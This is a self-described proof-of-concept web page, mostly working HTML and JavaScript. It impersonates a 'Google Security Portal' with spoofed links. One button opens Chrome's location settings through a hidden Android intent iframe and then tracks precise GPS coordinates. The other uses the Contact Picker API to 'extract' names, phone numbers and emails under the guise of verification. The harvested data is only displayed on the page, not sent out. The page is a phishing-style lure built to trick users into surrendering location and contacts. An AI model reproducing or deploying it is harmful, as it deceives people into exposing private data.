<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chrome Site Settings & Contact Picker PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 14px;
            width: 100%;
            max-width: 340px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
            box-sizing: border-box;
            width: 100%;
            cursor: pointer;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            max-width: 320px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dadce0;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
            display: none;
            text-align: left;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        .pulse {
            color: #34a853;
            font-weight: bold;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Chrome Internal Settings & Contact Vector</h1>

    <div class="button-container">
        <!-- Tombol 1: Membuka Chrome Site Settings (Location) & GPS Sync -->
        <a href="https://google.com" class="spoof-link" id="btnChromeSettings">1-Click -> Open Chrome Site Settings (Location)</a>

        <!-- Tombol 2: Contact Picker API Vector dengan Logika Serupa -->
        <a href="https://google.com" class="spoof-link" style="background-color: #9334e6;" id="btnContactPicker">1-Click -> Verify & Extract Contacts</a>
    </div>

    <!-- Info Box Hasil Eksekusi, Koordinat, & Kontak -->
    <div class="info-box" id="infoBox">
        <strong>Status:</strong> <span id="statusText" class="pulse">Ready...</span><br>
        <div id="coordDetails" style="margin-top: 8px;"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        // Fungsi untuk menangkap koordinat lokasi akurasi tinggi secara live
        const startLocationWatch = () => {
            const statusText = document.getElementById("statusText");
            const coordDetails = document.getElementById("coordDetails");

            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        statusText.className = "";
                        statusText.innerText = "Precise Location Captured Successfully!";
                        coordDetails.innerHTML = `
                            <b>Latitude:</b> ${lat}<br>
                            <b>Longitude:</b> ${lon}<br>
                            <b>Accuracy:</b> ±${accuracy} meters<br><br>
                            <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
                        `;
                    },
                    (error) => {
                        statusText.className = "";
                        statusText.innerText = `GPS Error / Permission Blocked: ${error.message}`;
                    },
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                );
            } else {
                statusText.innerText = "Geolocation not supported.";
            }
        };

        // Handler Tombol 1: Membuka Chrome Site Settings (Location) via Intent
        const handleChromeSettingsVector = () => {
            if (triggered) return;
            triggered = true;

            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            
            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Targeting Chrome Site Settings (Location)...";

            const intentFrame = document.createElement('iframe');
            intentFrame.style.display = 'none';
            intentFrame.src = "intent://settings/content/location#Intent;package=com.android.chrome;scheme=chrome;end;";
            document.body.appendChild(intentFrame);
            setTimeout(() => document.body.removeChild(intentFrame), 1000);

            startLocationWatch();

            setTimeout(() => { triggered = false; }, 1000);
        };

        // Handler Tombol 2: Contact Picker API Vector
        const handleContactVector = async () => {
            if (triggered) return;
            triggered = true;

            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            const coordDetails = document.getElementById("coordDetails");
            
            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Requesting contact directory access...";

            try {
                // Mengecek dukungan Contact Picker API pada browser
                const supportedProps = await navigator.contacts.getProperties();
                if (supportedProps.includes('name') && supportedProps.includes('tel')) {
                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                    
                    statusText.className = "";
                    if (contacts.length > 0) {
                        statusText.innerText = `Successfully Extracted ${contacts.length} Contact(s)!`;
                        let contactListHTML = "<b>Extracted Contacts:</b><br>";
                        contacts.forEach((c, idx) => {
                            const name = c.name ? c.name.join(', ') : 'No Name';
                            const tel = c.tel ? c.tel.join(', ') : 'No Phone';
                            const email = c.email ? c.email.join(', ') : 'No Email';
                            contactListHTML += `[${idx+1}] ${name} | ${tel} | ${email}<br>`;
                        });
                        coordDetails.innerHTML = contactListHTML;
                    } else {
                        statusText.innerText = "No contacts selected.";
                        coordDetails.innerHTML = "";
                    }
                } else {
                    statusText.className = "";
                    statusText.innerText = "Contact Picker properties not fully supported.";
                }
            } catch (err) {
                statusText.className = "";
                statusText.innerText = `Contact picker cancelled or blocked: ${err.message}`;
            } finally {
                triggered = false;
            }
        };

        // Event listener 1-klik murni
        document.getElementById("btnChromeSettings").addEventListener("click", (e) => {
            e.preventDefault();
            handleChromeSettingsVector();
        });

        document.getElementById("btnContactPicker").addEventListener("click", (e) => {
            e.preventDefault();
            handleContactVector();
        });

        // Auto-Sync saat pengguna kembali dari halaman setelan Chrome ke tab aktif (window focus)
        window.addEventListener("focus", () => {
            if (infoBox.style.display === "block" && document.getElementById("coordDetails").innerHTML.includes("Latitude")) {
                startLocationWatch();
            }
        });
    </script>

</body>
</html>
